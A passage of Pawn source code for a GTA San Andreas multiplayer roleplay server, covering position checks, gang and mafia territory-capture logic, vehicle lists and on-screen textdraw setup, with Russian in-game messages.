			||PlayerInfo[playerid][pMember] == 17 && PlayerToPoint(20.0,playerid,1668.5664,-2112.9648,13.5469) // Aztecas
			||PlayerInfo[playerid][pMember] == 18 && PlayerToPoint(20.0,playerid,2184.1218,-1803.6334,13.3693)) return true; // Rifa
	else return false;
}
stock IsAMedKit(playerid)
{
	if(PlayerInfo[playerid][pMember] == 12 && PlayerToPoint(20.0,playerid,-61.2984,1364.5847,1080.2109) // Ballas Base
			||PlayerInfo[playerid][pMember] == 13 && PlayerToPoint(20.0,playerid,2794.1233,-1607.5570,-36.5231) // Vagos Base
			||PlayerInfo[playerid][pMember] == 15 && PlayerToPoint(20.0,playerid,2496.0129,-1708.9232,1014.7422) // Groove Base
			||PlayerInfo[playerid][pMember] == 17 && PlayerToPoint(20.0,playerid,-49.7558,1400.3553,1084.4297) // Aztecas Base
			||PlayerInfo[playerid][pMember] == 18 && PlayerToPoint(20.0,playerid,2808.9631,-1169.0806,1025.5703) // rifa
			||PlayerInfo[playerid][pMember] == 5 && PlayerToPoint(70.0,playerid,1265.7104,-793.7453,1084.0078) && GetPlayerVirtualWorld(playerid) == 2
			||PlayerInfo[playerid][pMember] == 6 && PlayerToPoint(70.0,playerid,1265.7104,-793.7453,1084.0078) && GetPlayerVirtualWorld(playerid) == 0
			||PlayerInfo[playerid][pMember] == 14 && PlayerToPoint(70.0,playerid,1235.7234,-823.1919,1083.1563) && GetPlayerVirtualWorld(playerid) == 1) return true;
	else return false;
}
stock IsARespawn(playerid)
{
	if(PlayerToKvadrat(playerid,1642.71, -2174.57, 1770.71, -2073.57)
	|| PlayerToKvadrat(playerid,2538.71, -2073.57, 2794.71, -1972.57)
	|| PlayerToKvadrat(playerid,2154.71, -1871.57, 2282.71, -1770.57)
	|| PlayerToKvadrat(playerid,2410.71, -1770.57, 2666.71, -1669.57)
	|| PlayerToKvadrat(playerid,2666.71, -1669.57, 2794.71, -1568.57))
	{
		return true;
	}
	return false;
}
stock IsABank(playerid)
{
	if(GetPVarInt(playerid, "in_bank")) return true;
	/*if(PlayerToPoint(10.0,playerid,2307.65,-15.7474,26))
	{
		return true;
	}*/
	return false;
}
stock IsABankomat(playerid)
{
    for(new i = 1; i <= TOTALATM; i++) if(IsPlayerInRangeOfPoint(playerid, 1.0,ATMInfo[i][aX],ATMInfo[i][aY],ATMInfo[i][aZ])) return true;
	return false;
}
stock IsPlayerNearVehicle(playerid, vehicleid, Float:range)
{
    new Float:X, Float:Y, Float:Z;
    GetVehiclePos(vehicleid, X, Y, Z);
    if(IsPlayerInRangeOfPoint(playerid, range, X, Y, Z))return true;
    else return false;
}
stock IsNearOurCar(playerid)
{
	if(IsPlayerNearVehicle(playerid, house_car[playerid], 3.0)
	||IsPlayerNearVehicle(playerid, garage_car[playerid][0], 3.0)
	||IsPlayerNearVehicle(playerid, garage_car[playerid][1], 3.0)
	||IsPlayerNearVehicle(playerid, garage_car[playerid][2], 3.0)
	||IsPlayerNearVehicle(playerid, garage_car[playerid][3], 3.0)
	||IsPlayerNearVehicle(playerid, garage_car[playerid][4], 3.0))
	{
		return true;
	}
	return false;
}
stock IsAFoods(playerid)
{
	if(IsPlayerInRangeOfPoint(playerid, 2, -2420.219, 984.578, 44.297)) return true;
	else if(IsPlayerInRangeOfPoint(playerid, 2, -2420.180, 985.945, 44.297)) return true;
	else if(IsPlayerInRangeOfPoint(playerid, 2, 2225.203, -1153.422, 1025.906)) return true;
	else if(IsPlayerInRangeOfPoint(playerid, 2, 2576.703, -1284.430, 1061.094)) return true;
	else if(IsPlayerInRangeOfPoint(playerid, 2, 2155.906, 1606.773, 1000.055)) return true;
	else if(IsPlayerInRangeOfPoint(playerid, 2, 2209.906, 1607.195, 1000.055)) return true;
	else if(IsPlayerInRangeOfPoint(playerid, 2, 2222.203, 1606.773, 1000.055)) return true;
	else if(IsPlayerInRangeOfPoint(playerid, 2, 495.969, -24.320, 1000.734)) return true;
	else if(IsPlayerInRangeOfPoint(playerid, 2, 501.828, -1.430, 1000.734)) return true;
	else if(IsPlayerInRangeOfPoint(playerid, 2, 373.828, -178.141, 1000.734)) return true;
	else if(IsPlayerInRangeOfPoint(playerid, 2, 330.680, 178.500, 1020.070)) return true;
	else if(IsPlayerInRangeOfPoint(playerid, 2, 331.922, 178.500, 1020.070)) return true;
	else if(IsPlayerInRangeOfPoint(playerid, 2, 350.906, 206.086, 1008.477)) return true;
	else if(IsPlayerInRangeOfPoint(playerid, 2, 361.563, 158.617, 1008.477)) return true;
	else if(IsPlayerInRangeOfPoint(playerid, 2, 371.594, 178.453, 1020.070)) return true;
	else if(IsPlayerInRangeOfPoint(playerid, 2, 374.891, 188.977, 1008.477)) return true;
	else if(IsPlayerInRangeOfPoint(playerid, 2, 2155.844, 1607.875, 1000.063)) return true;
	else if(IsPlayerInRangeOfPoint(playerid, 2, 2202.453, 1617.008, 1000.063)) return true;
	else if(IsPlayerInRangeOfPoint(playerid, 2, 2209.242, 1621.211, 1000.063)) return true;
	else if(IsPlayerInRangeOfPoint(playerid, 2, 2222.367, 1602.641, 1000.063)) return true;
	else if(IsPlayerInRangeOfPoint(playerid, 2, 500.563, -1.367, 1000.734)) return true;
	else if(IsPlayerInRangeOfPoint(playerid, 2, 379.039, -178.883, 1000.734)) return true;
	else if(IsPlayerInRangeOfPoint(playerid, 2, 2480.86,-1959.27,12.9609)) return true;
	else if(IsPlayerInRangeOfPoint(playerid, 2, 1634.11,-2237.53,12.8906)) return true;
	else if(IsPlayerInRangeOfPoint(playerid, 2, 2139.52,-1161.48,23.3594)) return true;
	else if(IsPlayerInRangeOfPoint(playerid, 2, 2153.23,-1016.15,62.2344)) return true;
	else if(IsPlayerInRangeOfPoint(playerid, 2, -1350.12,493.859,10.5859)) return true;
	else if(IsPlayerInRangeOfPoint(playerid, 2, -2229.19,286.414,34.7031)) return true;
	else if(IsPlayerInRangeOfPoint(playerid, 2, 1659.46,1722.86,10.2188)) return true;
	else if(IsPlayerInRangeOfPoint(playerid, 2, 2647.7,1129.66,10.2188)) return true;
	else if(IsPlayerInRangeOfPoint(playerid, 2, 2845.73,1295.05,10.7891)) return true;
	else if(IsPlayerInRangeOfPoint(playerid, 2, 1398.84,2222.61,10.4219)) return true;
	else if(IsPlayerInRangeOfPoint(playerid, 2, -1455.12,2591.66,55.2344)) return true;
	else if(IsPlayerInRangeOfPoint(playerid, 2, -76.0312,1227.99,19.125)) return true;
	else if(IsPlayerInRangeOfPoint(playerid, 2, 662.43,-552.164,15.7109)) return true;
	else if(IsPlayerInRangeOfPoint(playerid, 2, -253.742,2599.76,62.2422)) return true;
	else if(IsPlayerInRangeOfPoint(playerid, 2, 2271.73,-76.4609,25.9609)) return true;
	else if(IsPlayerInRangeOfPoint(playerid, 2, 1789.21,-1369.27,15.1641)) return true;
	else if(IsPlayerInRangeOfPoint(playerid, 2, 1729.79,-1943.05,12.9453)) return true;
	else if(IsPlayerInRangeOfPoint(playerid, 2, 2060.12,-1897.64,12.9297)) return true;
	else if(IsPlayerInRangeOfPoint(playerid, 2, 1928.73,-1772.45,12.9453)) return true;
	else if(IsPlayerInRangeOfPoint(playerid, 2, 2325.98,-1645.13,14.2109)) return true;
	else if(IsPlayerInRangeOfPoint(playerid, 2, 2352.18,-1357.16,23.7734)) return true;
	else if(IsPlayerInRangeOfPoint(playerid, 2, 1154.73,-1460.89,15.1562)) return true;
	else if(IsPlayerInRangeOfPoint(playerid, 2, -1350.12,492.289,10.5859)) return true;
	else if(IsPlayerInRangeOfPoint(playerid, 2, -2118.97,-423.648,34.7266)) return true;
	else if(IsPlayerInRangeOfPoint(playerid, 2, -2118.62,-422.414,34.7266)) return true;
	else if(IsPlayerInRangeOfPoint(playerid, 2, -2097.27,-398.336,34.7266)) return true;
	else if(IsPlayerInRangeOfPoint(playerid, 2, -2092.09,-490.055,34.7266)) return true;
	else if(IsPlayerInRangeOfPoint(playerid, 2, -2063.27,-490.055,34.7266)) return true;
	else if(IsPlayerInRangeOfPoint(playerid, 2, -2005.65,-490.055,34.7266)) return true;
	else if(IsPlayerInRangeOfPoint(playerid, 2, -2034.46,-490.055,34.7266)) return true;
	else if(IsPlayerInRangeOfPoint(playerid, 2, -2068.56,-398.336,34.7266)) return true;
	else if(IsPlayerInRangeOfPoint(playerid, 2, -2039.85,-398.336,34.7266)) return true;
	else if(IsPlayerInRangeOfPoint(playerid, 2, -2011.14,-398.336,34.7266)) return true;
	else if(IsPlayerInRangeOfPoint(playerid, 2, -1980.79,142.664,27.0703)) return true;
	else if(IsPlayerInRangeOfPoint(playerid, 2, 2319.99,2532.85,10.2188)) return true;
	else if(IsPlayerInRangeOfPoint(playerid, 2, 1520.15,1055.27,10.00)) return true;
	else if(IsPlayerInRangeOfPoint(playerid, 2, 2503.14,1243.7,10.2188)) return true;
	else if(IsPlayerInRangeOfPoint(playerid, 2, 2085.77,2071.36,10.4531)) return true;
	else if(IsPlayerInRangeOfPoint(playerid, 2, -862.828,1536.61,21.9844)) return true;
	else if(IsPlayerInRangeOfPoint(playerid, 2, -14.7031,1175.36,18.9531)) return true;
	else if(IsPlayerInRangeOfPoint(playerid, 2, -253.742,2597.95,62.2422)) return true;
	else if(IsPlayerInRangeOfPoint(playerid, 2, 201.016,-107.617,0.898438)) return true;
	else if(IsPlayerInRangeOfPoint(playerid, 2, 1277.84,372.516,18.9531)) return true;
	else return false;
}
stock PJ(carid){switch(GetVehicleModel(carid)){case 534,535,536,558,559,560,561,562,565,575,576,483,567:return true;}return false;}
stock zapretgun(playerid){switch(GetPlayerWeapon(playerid)){case 4,16,17,18,27,26,28,32,37,36,42,38,45,35:return true;}return false;}
stock IsABoat(carid){switch(GetVehicleModel(carid)){case 472,473,493,595,484,430,452..454,446:return true;}return false;}
stock IsABike(carid){switch(GetVehicleModel(carid)){case 448,435,449,450,457,462,464,465,481,485,501,509,510,530,564,569,570,584,594,606,607,608,610,611:return true;}return false;}
stock IsAtWormPlace(playerid)
{
	if(PlayerToPoint(350.0,playerid,-256.47,-1353.23,8.39)) return 1;
	else if(PlayerToPoint(200.0,playerid,1942.10,211.14,30.32)) return 2;
	else if(PlayerToPoint(250.0,playerid,-1104.82,-989.44,129.22)) return 3;
	else if(PlayerToPoint(250.0,playerid,-11.38,-69,3.12)) return 3;
	else if(PlayerToPoint(40.0,playerid,-207.20,-5.28,3.11)) return 3;
	return false;
}
stock IsAtFishPlace(playerid)
{
	if(PlayerToPoint(40.0,playerid,403.8266,-2088.7598,7.8359)) return 1;
	else if(PlayerToPoint(40.0,playerid,1628.1157,577.1617,1.7578)) return 2;
	else if(PlayerToPoint(40.0,playerid,834.62,-2067.49,12.98)) return 3;
	return false;
}
stock IsAtTPlace(playerid)
{
	if(PlayerToPoint(10.0,playerid,256.4736,1414.5182,10.7075)) return 1;
	else if(PlayerToPoint(10.0,playerid,-1046.7723,-670.7208,32.3516)) return 2;
	else if(PlayerToPoint(10.0,playerid,608.7718,847.8765,-43.1532)) return 3;
	else if(PlayerToPoint(10.0,playerid,-1873.0896,-1720.2430,21.7500)) return 4;
	else if(PlayerToPoint(10.0,playerid,-449.3336,-65.9115,59.4158)) return 5;
	else if(PlayerToPoint(10.0,playerid,-1978.6846,-2434.8274,30.6250)) return 6;
	else if(PlayerToPoint(10.0,playerid,2601.7222,-2226.5867,13.3732)) return 7;
	else if(PlayerToPoint(10.0,playerid,-1731.4509,118.9413,3.5547)) return 8;
	return false;
}
stock IsAtBPlace(playerid)
{
	if(PlayerToPoint(7.0,playerid,-1027.4069,-593.4584,32.0126)) return 1;
	else if(PlayerToPoint(7.0,playerid,-514.4622,-543.0626,25.5234)) return 2;
	return false;
}
stock IsAtTTPlace(playerid)
{
	if(PlayerToPoint(10.0,playerid,2601.7222,-2226.5867,13.3732)) return 1;
	else if(PlayerToPoint(10.0,playerid,-1731.4509,118.9413,3.5547)) return 2;
	return false;
}
stock GetXYInBackOfPlayer(const playerid, &Float:x, &Float:y, const Float:distance)
{
	new Float:a; GetPlayerPos(playerid, x, y, a); GetPlayerFacingAngle(playerid, a);
	if (IsPlayerInAnyVehicle(playerid))
	{
		new vid=GetPlayerVehicleID(playerid);
		if (vid > 0 && vid <= MAX_VEHICLES)GetVehicleZAngle(vid, a);
	}
	x -= (distance * floatsin(-a, degrees)); y -= (distance * floatcos(-a, degrees));
}
// /bizwar
new WarStart;
new MFrakCD[20];
new ZoneWar;
new ZoneID;
new ZoneTimer;

new TotalGzR;
new TotalGzA;
new TotalGzB;
new TotalGzG;
new TotalGzV;
new OnZONE[131][20];
new ZoneOnBattle[131];
new allowedfactions[] = {12,13,15,17,18};
new GZSafeTime[131];
enum GzoneInfo
{
	gID,
	gZone,
Float:gCoords[4],
	gFrakVlad,
	gNapad
}
new GZInfo[131][GzoneInfo], TOTALGZ;
new FrakCD[20];
publics: MzCheck()
{
	for(new i = 1;i <= TotalBizz; i++)
	{
		new strs[32],sss[32];
		switch(BizzInfo[i][bCapture])
		{
		    case 5: strs = "LCN";
		    case 6: strs = "Yakuza";
		    case 14: strs ="Russian Mafia";
		}
		switch(BizzInfo[i][bMafia])
		{
		    case 5: sss = "LCN";
		    case 6: sss = "Yakuza";
		    case 14: sss ="Russian Mafia";
		}
		foreach(x)
		{
			if(BizzInfo[i][bCapture] == 0) break;
		    if(PlayerInfo[x][pMember] == BizzInfo[i][bCapture] || PlayerInfo[x][pMember] == BizzInfo[i][bMafia])
		    {
				if(!GetPVarInt(x,"mafia_war"))
				{
					PlayerTextDrawShow(x, Capture[x]);
					SetPVarInt(x,"mafia_war",1);
					SetPlayerToTeamColor(x);
				}
				format(string,120,"~y~kills~n~~n~~g~%s:~w~ %i~n~~r~%s:~w~ %i", strs, MafiaKills[BizzInfo[i][bCapture]] ,sss, MafiaKills[BizzInfo[i][bMafia]]);
				PlayerTextDrawSetString(x,Capture[x],string);
		    }
		}
		if(BizzInfo[i][bCapture] == 0 || MFrakCD[BizzInfo[i][bCapture]] != 1) continue;
		ZoneTimer--;
		if(ZoneTimer <= 0)
		{
			MFrakCD[BizzInfo[i][bMafia]] = 0;
			MFrakCD[BizzInfo[i][bCapture]] = 0;
			SendFamilyMessage(BizzInfo[i][bMafia],COLOR_GREEN, " Вы отстояли свой бизнес");
			SendFamilyMessage(BizzInfo[i][bCapture],COLOR_RED, " Вам не удалось завоевать ещё один бизнес");
			foreach(y)
			{
				if(PlayerInfo[y][pMember] == BizzInfo[i][bMafia] || PlayerInfo[y][pMember] == BizzInfo[i][bCapture])
				{
					DeletePVar(y,"mafia_war");
					PlayerTextDrawHide(y, Capture[y]);
					for(new i_ = 0; i_ < 5; i_++) { SendDeathMessageToPlayer(y,INVALID_PLAYER_ID-1, INVALID_PLAYER_ID-1, 0); }
				}
			}
			BizzInfo[i][bCapture] = 0;
			WarStart = 7200;
			ZoneID = 0;
			ZoneTimer = 0;
			GangZoneStopFlashForAll(ZoneWar);
			GangZoneHideForAll(ZoneWar);
			KillTimer(MzCheckTimer);
		}
		else
		{
			new ZonePlayer[20] = 0;
			foreach(x)
			{
				if(ZoneID == 1 && IsAMafia(x))
				{
					if(PlayerToKvadrat(x,351.314666, 2455.576416, 439.314666, 2551.576416)) ZonePlayer[PlayerInfo[x][pMember]] ++;
				}
				else if(ZoneID == 2 && IsAMafia(x))
				{
					if(PlayerToKvadrat(x,393.8914,983.9361, 324.6188,833.3795)) ZonePlayer[PlayerInfo[x][pMember]] ++;
				}
				else if(ZoneID == 3 && IsAMafia(x))
				{
					if(PlayerToKvadrat(x,-789.8281,2015.9144, -662.7654,2083.9297)) ZonePlayer[PlayerInfo[x][pMember]] ++;
				}
			}
			new asd[0x2];
			for(new x = 0; x < 20; x++) if(ZonePlayer[x] > 0) asd[0x0]++,asd[0x1] = x;
			if(asd[0x0] == 1)
			{
				if(BizzInfo[i][bMafia] == asd[0x1])
				{
					MFrakCD[BizzInfo[i][bMafia]] = 0;
					MFrakCD[BizzInfo[i][bCapture]] = 0;
					SendFamilyMessage(BizzInfo[i][bMafia],COLOR_GREEN, " Вы отстояли свой бизнес");
					SendFamilyMessage(BizzInfo[i][bCapture],COLOR_RED, " Вам не удалось завоевать ещё один бизнес");
					foreach(y)
					{
						if(PlayerInfo[y][pMember] == BizzInfo[i][bMafia] || PlayerInfo[y][pMember] == BizzInfo[i][bCapture])
						{
							DeletePVar(y,"mafia_war");
							PlayerTextDrawHide(y, Capture[y]);
							for(new i_ = 0; i_ < 5; i_++) { SendDeathMessageToPlayer(y,INVALID_PLAYER_ID-1, INVALID_PLAYER_ID-1, 0); }
						}
					}
					BizzInfo[i][bCapture] = 0;
				}
				else
				{
					MFrakCD[BizzInfo[i][bMafia]] = 0;
					MFrakCD[BizzInfo[i][bCapture]] = 0;
					SendFamilyMessage(BizzInfo[i][bCapture],COLOR_GREEN, " Вы завоевали новый бизнес");
					SendFamilyMessage(BizzInfo[i][bMafia],COLOR_RED, " Вы потеряли контроль над одним из своих бизнесов");
					foreach(y)
					{
						if(PlayerInfo[y][pMember] == BizzInfo[i][bMafia] || PlayerInfo[y][pMember] == BizzInfo[i][bCapture])
						{
							DeletePVar(y,"mafia_war");
							PlayerTextDrawHide(y, Capture[y]);
							for(new i_ = 0; i_ < 5; i_++) { SendDeathMessageToPlayer(y,INVALID_PLAYER_ID-1, INVALID_PLAYER_ID-1, 0); }
						}
					}
					BizzInfo[i][bMafia] = BizzInfo[i][bCapture];
					BizzInfo[i][bCapture] = 0;
				}
			}
			WarStart = 7200;
			ZoneID = 0;
			ZoneTimer = 0;
			GangZoneStopFlashForAll(ZoneWar);
			GangZoneHideForAll(ZoneWar);
			KillTimer(MzCheckTimer);
			break;
		}
	}
	return true;
}
publics: GzCheck()
{
	for(new i = 1; i <= TOTALGZ; i++)
	{
		if(!ZoneOnBattle[i]) continue;
		if(GZSafeTime[i] > 0) GZSafeTime[i] --;
		foreach(x)
		{
			if(!PlayerInfo[x][pLogin]) continue;
			new y = PlayerInfo[x][pMember];
			if(y == GZInfo[i][gNapad] || y == GZInfo[i][gFrakVlad])
			{
				if(!GetPVarInt(x,"capture_on"))
				{
					PlayerTextDrawShow(x, Capture[x]);
					SetPVarInt(x,"capture_on",1);
					SetPlayerToTeamColor(x);
				}
				format(string,120,"~y~kills~n~~n~~g~%s:~w~ %i~n~~r~%s:~w~ %i",GetGangName(GZInfo[i][gFrakVlad]),CountOnZone[GZInfo[i][gFrakVlad]],GetGangName(GZInfo[i][gNapad]),CountOnZone[GZInfo[i][gNapad]]);
				PlayerTextDrawSetString(x,Capture[x],string);
				if(PlayerToKvadrat(x,GZInfo[i][gCoords][0], GZInfo[i][gCoords][1],GZInfo[i][gCoords][2],GZInfo[i][gCoords][3])) OnZONE[i][y] ++;
			}
		}
		new asd;
		for(new x =0;x<20;x++)
		{
			if(OnZONE[i][x] > 0 && IsInAllowedF(x) && GZSafeTime[i] <= 0) asd++;
		}
		if(asd == 1)
		{
			for(new x =0;x<20;x++)
			{
				if(OnZONE[i][x] > 0)
				{
					if(GZInfo[i][gFrakVlad] == x)
					{
						SendFamilyMessage(GZInfo[i][gFrakVlad],0x00B953AA," Вы отстояли свою территорию");
						SendFamilyMessage(GZInfo[i][gNapad],0xC56565AA," Вам не удалось захватить территорию");
						CountOnZone[GZInfo[i][gFrakVlad]] = 0;
						CountOnZone[GZInfo[i][gNapad]] = 0;
						foreach(y)
						{
							if(PlayerInfo[y][pMember] == GZInfo[i][gNapad] || PlayerInfo[y][pMember] == GZInfo[i][gFrakVlad])
							{
								DeletePVar(y,"capture_on");
								PlayerTextDrawHide(y, Capture[y]);
								for(new i_ = 0; i_ < 5; i_++) { SendDeathMessageToPlayer(y,INVALID_PLAYER_ID-1, INVALID_PLAYER_ID-1, 0); }
							}
						}
					}
					else
					{
						CountOnZone[GZInfo[i][gFrakVlad]] = 0;
						CountOnZone[GZInfo[i][gNapad]] = 0;
						SendFamilyMessage(GZInfo[i][gNapad], 0x00B953AA," Вы взяли под свой контроль новую территорию");
						for(new y = 1; y <= TOTALGZ; y++)
						{
							if(GZInfo[y][gFrakVlad] == 12) TotalGzB++;
							if(GZInfo[y][gFrakVlad] == 13) TotalGzV++;
							if(GZInfo[y][gFrakVlad] == 15) TotalGzG++;
							if(GZInfo[y][gFrakVlad] == 17) TotalGzA++;
							if(GZInfo[y][gFrakVlad] == 18) TotalGzR++;
						}
						switch(GZInfo[i][gNapad])
						{
						case 12: format(string, 144, " Теперь ваша банда будет получать каждый час %i вирт",TotalGzB*300), gRating[Ballas] += 5000;
						case 13: format(string, 144, " Теперь ваша банда будет получать каждый час %i вирт",TotalGzV*300), gRating[Vagos] += 5000;
						case 15: format(string, 144, " Теперь ваша банда будет получать каждый час %i вирт",TotalGzG*300), gRating[Grove] += 5000;
						case 17: format(string, 144, " Теперь ваша банда будет получать каждый час %i вирт",TotalGzA*300), gRating[Aztec] += 5000;
						case 18: format(string, 144, " Теперь ваша банда будет получать каждый час %i вирт",TotalGzR*300), gRating[Rifa] += 5000;
						}
						SendFamilyMessage(GZInfo[i][gFrakVlad], 0xC56565AA," Вы потеряли контроль одной из своих территорий");
						foreach(y)
						{
							if(PlayerInfo[y][pMember] == GZInfo[i][gNapad] || PlayerInfo[y][pMember] == GZInfo[i][gFrakVlad])
							{
								DeletePVar(y,"capture_on");
								PlayerTextDrawHide(y, Capture[y]);
								for(new i_ = 0; i_ < 5; i_++) { SendDeathMessageToPlayer(y,INVALID_PLAYER_ID-1, INVALID_PLAYER_ID-1, 0); }
							}
						}
						GZInfo[i][gFrakVlad] = GZInfo[i][gNapad];
						SendFamilyMessage(GZInfo[i][gNapad], 0x00B953AA, string);
					}
					ClearTotalGz();
					ZoneOnBattle[i] = 0;
					GangZoneStopFlashForAll(GZInfo[i][gZone]);
					GangZoneHideForAll(GZInfo[i][gZone]);
					GangZoneShowForAll(GZInfo[i][gZone],GetGangZoneColor(i));
					GZInfo[i][gNapad] = 0;
					UpdateTable(TABLE_GANGZONE,"gang_owner",GZInfo[i][gFrakVlad],"id",GZInfo[i][gID]);
					break;
				}
			}
		}
	}
	for(new i = 1; i <= TOTALGZ; i++)
	{
		for(new z = 0;z<20;z++)
		{
			OnZONE[i][z] =0;
		}
	}
	return true;
}
stock IsInAllowed(playerid)
{
	for(new i = 0; i < sizeof(allowedfactions); i++)
	{
		if(PlayerInfo[playerid][pMember] == allowedfactions[i]&&PlayerInfo[playerid][pRank] >= 7) return true;
	}
	return false;
}
stock IsAPlane(carid){switch(GetVehicleModel(carid)){case 592,577,511,512,593,520,553,476,519,460,513,548,417,487,488,497,563,447,469:return true;}return false;}
publics: IsAGunsCar(carid)
{
	if(carid == gunscar[0]
			||carid == gunscar[1]
			||carid == gunscar[2]
			||carid == gunscar[3]
			||carid == gunscar[4]
			||carid == gunscar[5]
			||carid == gunscar[6])
	{
		return true;
	}
	return false;
}
stock CreateTextDraws(playerid)
{
	RouletText[playerid] = CreatePlayerTextDraw(playerid,434.000000, 318.000000,"");
	PlayerTextDrawBackgroundColor(playerid,RouletText[playerid], 255);
	PlayerTextDrawAlignment(playerid,RouletText[playerid], 0);
	PlayerTextDrawLetterSize(playerid,RouletText[playerid],0.500000, 2.100000);
	PlayerTextDrawFont(playerid,RouletText[playerid],0);
	PlayerTextDrawColor(playerid,RouletText[playerid],0xE1E1E1AA);
	PlayerTextDrawSetOutline(playerid,RouletText[playerid],0);
	PlayerTextDrawSetProportional(playerid,RouletText[playerid],2);
	PlayerTextDrawHide(playerid,RouletText[playerid]);
	// Кости
	PlayerBone[playerid][0] = CreatePlayerTextDraw(playerid, 556.603332, 142.333358, "Table_1");
	PlayerTextDrawLetterSize(playerid, PlayerBone[playerid][0], 0.491228, 1.524165);
	PlayerTextDrawAlignment(playerid, PlayerBone[playerid][0], 2);
	PlayerTextDrawColor(playerid, PlayerBone[playerid][0], 548012031);
	PlayerTextDrawUseBox(playerid, PlayerBone[playerid][0], true);
	PlayerTextDrawBoxColor(playerid, PlayerBone[playerid][0], 0);
	PlayerTextDrawSetShadow(playerid, PlayerBone[playerid][0], 0);
	PlayerTextDrawSetOutline(playerid, PlayerBone[playerid][0], 1);
	PlayerTextDrawBackgroundColor(playerid, PlayerBone[playerid][0], 51);
	PlayerTextDrawFont(playerid, PlayerBone[playerid][0], 0);
	PlayerTextDrawSetProportional(playerid, PlayerBone[playerid][0], 1);

	PlayerBone[playerid][1] = CreatePlayerTextDraw(playerid, 527.309020, 163.916000, "_");
	PlayerTextDrawLetterSize(playerid, PlayerBone[playerid][1], 0.175188, 1.010665);
	PlayerTextDrawAlignment(playerid, PlayerBone[playerid][1], 1);
	PlayerTextDrawColor(playerid, PlayerBone[playerid][1], -1347440641);
	PlayerTextDrawUseBox(playerid, PlayerBone[playerid][1], true);
	PlayerTextDrawBoxColor(playerid, PlayerBone[playerid][1], 0);
	PlayerTextDrawSetShadow(playerid, PlayerBone[playerid][1], 0);
	PlayerTextDrawSetOutline(playerid, PlayerBone[playerid][1], 1);
	PlayerTextDrawBackgroundColor(playerid, PlayerBone[playerid][1], 51);
	PlayerTextDrawFont(playerid, PlayerBone[playerid][1], 1);
	PlayerTextDrawSetProportional(playerid, PlayerBone[playerid][1], 1);

	PlayerBone[playerid][2] = CreatePlayerTextDraw(playerid, 585.057067, 165.082687, "++~n~--~n~++~n~--~n~--");
	PlayerTextDrawLetterSize(playerid, PlayerBone[playerid][2], 0.175188, 1.010665);
	PlayerTextDrawAlignment(playerid, PlayerBone[playerid][2], 2);
	PlayerTextDrawColor(playerid, PlayerBone[playerid][2], -1347440641);
	PlayerTextDrawUseBox(playerid, PlayerBone[playerid][2], true);
	PlayerTextDrawBoxColor(playerid, PlayerBone[playerid][2], 0);
	PlayerTextDrawSetShadow(playerid, PlayerBone[playerid][2], 0);
	PlayerTextDrawSetOutline(playerid, PlayerBone[playerid][2], 1);
	PlayerTextDrawBackgroundColor(playerid, PlayerBone[playerid][2], 51);
	PlayerTextDrawFont(playerid, PlayerBone[playerid][2], 1);
	PlayerTextDrawSetProportional(playerid, PlayerBone[playerid][2], 1);

	PlayerBone[playerid][3] = CreatePlayerTextDraw(playerid, 527.086486, 214.666687, "Bet:_100000~n~Bank:_200000~n~Money:_330500");
	PlayerTextDrawLetterSize(playerid, PlayerBone[playerid][3], 0.186432, 1.115664);
	PlayerTextDrawAlignment(playerid, PlayerBone[playerid][3], 1);
	PlayerTextDrawColor(playerid, PlayerBone[playerid][3], -1347440641);
	PlayerTextDrawSetShadow(playerid, PlayerBone[playerid][3], 0);
	PlayerTextDrawSetOutline(playerid, PlayerBone[playerid][3], 1);
	PlayerTextDrawBackgroundColor(playerid, PlayerBone[playerid][3], 51);
	PlayerTextDrawFont(playerid, PlayerBone[playerid][3], 1);
	PlayerTextDrawSetProportional(playerid, PlayerBone[playerid][3], 1);

	FishingText[playerid] = CreatePlayerTextDraw(playerid,49.194732, 245.583328, "~y~Press: ~w~L.Alt~n~~n~~y~Tackle: ~w~0~n~~y~Worms: ~w~0~n~~y~Sonar: ~w~0");
	PlayerTextDrawAlignment(playerid,FishingText[playerid], 1);
	PlayerTextDrawBackgroundColor(playerid,FishingText[playerid], 255);
	PlayerTextDrawFont(playerid,FishingText[playerid], 1);
	PlayerTextDrawLetterSize(playerid,FishingText[playerid], 0.388624, 1.220832);
	PlayerTextDrawColor(playerid,FishingText[playerid], 0xFFFF1FAA);
	PlayerTextDrawSetOutline(playerid,FishingText[playerid], 0);
	PlayerTextDrawSetProportional(playerid,FishingText[playerid], 1);
	PlayerTextDrawSetShadow(playerid,FishingText[playerid], 0);
	PlayerTextDrawSetSelectable(playerid,FishingText[playerid], 0);
	PlayerTextDrawHide(playerid,FishingText[playerid]);
	//========================================================================== Спидометр
	SpeedShow[playerid] = CreatePlayerTextDraw(playerid,327.054473, 394.333343, "_");
	PlayerTextDrawBackgroundColor(playerid,SpeedShow[playerid], 96);
	PlayerTextDrawAlignment(playerid,SpeedShow[playerid], 1);
	PlayerTextDrawLetterSize(playerid,SpeedShow[playerid],0.496852, 1.716667);
	PlayerTextDrawFont(playerid,SpeedShow[playerid],0);
	PlayerTextDrawColor(playerid,SpeedShow[playerid], 208117759);
	PlayerTextDrawSetOutline(playerid,SpeedShow[playerid],1);
	PlayerTextDrawSetProportional(playerid,SpeedShow[playerid],1);
	PlayerTextDrawSetShadow(playerid,SpeedShow[playerid],0);
	PlayerTextDrawHide(playerid, SpeedShow[playerid]);
	//==========================================================================
	StatusShow[playerid] = CreatePlayerTextDraw(playerid,414.199462, 405.416809, "_");
	PlayerTextDrawBackgroundColor(playerid,StatusShow[playerid], 255);
	PlayerTextDrawLetterSize(playerid,StatusShow[playerid],0.463586, 1.168333);
	PlayerTextDrawFont(playerid,StatusShow[playerid], 1);
	PlayerTextDrawColor(playerid,StatusShow[playerid], -16776961);
	PlayerTextDrawSetOutline(playerid,StatusShow[playerid], 1);
	PlayerTextDrawSetProportional(playerid,StatusShow[playerid],1);
	PlayerTextDrawSetShadow(playerid,StatusShow[playerid],0);
	PlayerTextDrawHide(playerid, StatusShow[playerid]);
	//==========================================================================
	KMShow[playerid] = CreatePlayerTextDraw(playerid,357.976928, 396.666717, "KM/H");
	PlayerTextDrawBackgroundColor(playerid,KMShow[playerid], 128);
	PlayerTextDrawLetterSize(playerid,KMShow[playerid],0.278052, 1.185832);
	PlayerTextDrawFont(playerid,KMShow[playerid], 2);
	PlayerTextDrawColor(playerid,KMShow[playerid], 208117604);
	PlayerTextDrawSetOutline(playerid,KMShow[playerid], 1);
	PlayerTextDrawSetProportional(playerid,KMShow[playerid],1);
	PlayerTextDrawSetShadow(playerid,KMShow[playerid],0);
	PlayerTextDrawHide(playerid, KMShow[playerid]);
	/////////////////////////
